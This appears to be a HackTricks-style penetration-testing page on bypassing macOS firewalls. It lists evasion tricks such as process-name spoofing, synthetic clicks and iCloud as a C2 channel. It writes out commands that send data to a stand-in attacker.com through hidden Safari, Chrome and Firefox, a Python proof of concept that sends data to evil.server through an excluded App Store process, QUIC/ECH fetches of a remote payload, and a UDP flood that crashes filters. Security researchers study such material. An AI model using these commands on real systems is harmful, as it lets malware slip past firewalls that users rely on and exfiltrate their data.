_body: "# macOS Bypassing Firewalls\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Found techniques\n\nThe following\
  \ techniques were found working in some macOS firewall apps.\n\n### Abusing whitelist names\n\n- For example calling the\
  \ malware with names of well known macOS processes like **`launchd`**\n\n### Synthetic Click\n\n- If the firewall ask for\
  \ permission to the user make the malware **click on allow**\n\n### **Use Apple signed binaries**\n\n- Like **`curl`**,\
  \ but also others like **`whois`**\n\n### Well known apple domains\n\nThe firewall could be allowing connections to well\
  \ known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.\n\n### Generic Bypass\n\
  \nSome ideas to try to bypass firewalls\n\n### Check allowed traffic\n\nKnowing the allowed traffic will help you identify\
  \ potentially whitelisted domains or which applications are allowed to access them\n\n```bash\nlsof -i TCP -sTCP:ESTABLISHED\n\
  ```\n\n### Abusing DNS\n\nDNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed\
  \ to contact DNS servers.\n\n<figure><img src=\"../../images/image (468).png\" alt=\"https://www.youtube.com/watch?v=UlT5KFTMn2k\"\
  ><figcaption></figcaption></figure>\n\n### Via Browser apps\n\n- **oascript**\n\n```applescript\ntell application \"Safari\"\
  \n    run\n    tell application \"Finder\" to set visible of process \"Safari\" to false\n    make new document\n    set\
  \ the URL of document 1 to \"https://attacker.com?data=data%20to%20exfil\nend tell\n```\n\n- Google Chrome\n\n```bash\n\"\
  Google Chrome\" --crash-dumps-dir=/tmp --headless \"https://attacker.com?data=data%20to%20exfil\"\n```\n\n- Firefox\n\n\
  ```bash\nfirefox-bin --headless \"https://attacker.com?data=data%20to%20exfil\"\n```\n\n- Safari\n\n```bash\nopen -j -a\
  \ Safari \"https://attacker.com?data=data%20to%20exfil\"\n```\n\n### Via processes injections\n\nIf you can **inject code\
  \ into a process** that is allowed to connect to any server you could bypass the firewall protections:\n\n\n{{#ref}}\nmacos-proces-abuse/\n\
  {{#endref}}\n\n---\n\n## Recent macOS firewall bypass vulnerabilities (2023-2025)\n\n### Web content filter (Screen Time)\
  \ bypass – **CVE-2024-44206**\nIn July 2024 Apple patched a critical bug in Safari/WebKit that broke the system-wide “Web\
  \ content filter” used by Screen Time parental controls.\nA specially crafted URI (for example, with double URL-encoded\
  \ “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any\
  \ process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked\
  \ by the user or an MDM profile.\n\nPractical test (un-patched system):\n\n```bash\nopen \"http://attacker%2Ecom%2F./\"\
  \   # should be blocked by Screen Time\n# if the patch is missing Safari will happily load the page\n```\n\n### Packet Filter\
  \ (PF) rule-ordering bug in early macOS 14 “Sonoma”\nDuring the macOS 14 beta cycle Apple introduced a regression in the\
  \ userspace wrapper around **`pfctl`**.\nRules that were added with the `quick` keyword (used by many VPN kill-switches)\
  \ were silently ignored, causing traffic leaks even when a VPN/firewall GUI reported *blocked*. The bug was confirmed by\
  \ several VPN vendors and fixed in RC 2 (build 23A344).\n\nQuick leak-check:\n\n```bash\npfctl -sr | grep quick       #\
  \ rules are present…\nsudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface\n```\n\n### Abusing\
  \ Apple-signed helper services (legacy – pre-macOS 11.2)\nBefore macOS 11.2 the **`ContentFilterExclusionList`** allowed\
  \ ~50 Apple binaries such as **`nsurlsessiond`** and the App Store to bypass all socket-filter firewalls implemented with\
  \ the Network Extension framework (LuLu, Little Snitch, etc.).\nMalware could simply spawn an excluded process—or inject\
  \ code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in\
  \ macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.\n\nExample proof-of-concept (pre-11.2):\n\
  \n```python\nimport subprocess, socket\n# Launch excluded App Store helper (path collapsed for clarity)\nsubprocess.Popen(['/System/Applications/App\\\
  \\ Store.app/Contents/MacOS/App Store'])\n# Connect through the inherited socket\ns = socket.create_connection((\"evil.server\"\
  , 443))\ns.send(b\"exfil...\")\n```\n\n### QUIC/ECH to evade Network Extension domain filters (macOS 12+)\nNEFilter Packet/Data\
  \ Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)**\
  \ the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked\
  \ domains without touching DNS.\n\nMinimal PoC:\n\n```bash\n# Chrome/Edge – force HTTP/3 and ECH\n/Applications/Google\\\
  \ Chrome.app/Contents/MacOS/Google\\ Chrome \\\n  --enable-quic --origin-to-force-quic-on=attacker.com:443 \\\n  --enable-features=EncryptedClientHello\
  \ --user-data-dir=/tmp/h3test \\\n  https://attacker.com/payload\n\n# cURL 8.10+ built with quiche\ncurl --http3-only https://attacker.com/payload\n\
  ```\n\nIf QUIC/ECH is still enabled this is an easy hostname-filter evasion path.\n\n### macOS 15 “Sequoia” Network Extension\
  \ instability (2024–2025)\nEarly 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch,\
  \ Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding\
  \ the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window\
  \ for C2/exfil while the GUI still claims the firewall is running.\n\nQuick reproduction (safe lab box):\n\n```bash\n# create\
  \ many short UDP flows to exhaust NE filter queues\npython3 - <<'PY'\nimport socket, os\nfor i in range(5000):\n    s =\
  \ socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    s.sendto(b'X'*32, ('1.1.1.1', 53))\nPY\n# watch for NetExt crash\
  \ / reconnect loop\nlog stream --predicate 'subsystem == \"com.apple.networkextension\"' --style syslog\n```\n\n---\n\n\
  ## Tooling tips for modern macOS\n\n1. Inspect current PF rules that GUI firewalls generate:\n   ```bash\n   sudo pfctl\
  \ -a com.apple/250.ApplicationFirewall -sr\n   ```\n2. Enumerate binaries that already hold the *outgoing-network* entitlement\
  \ (useful for piggy-backing):\n   ```bash\n   codesign -d --entitlements :- /path/to/bin 2>/dev/null \\\n       | plutil\
  \ -extract com.apple.security.network.client xml1 -o - -\n   ```\n3. Programmatically register your own Network Extension\
  \ content filter in Objective-C/Swift.  \n   A minimal rootless PoC that forwards packets to a local socket is available\
  \ in Patrick Wardle’s **LuLu** source code.\n\n## References\n\n- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)\n\
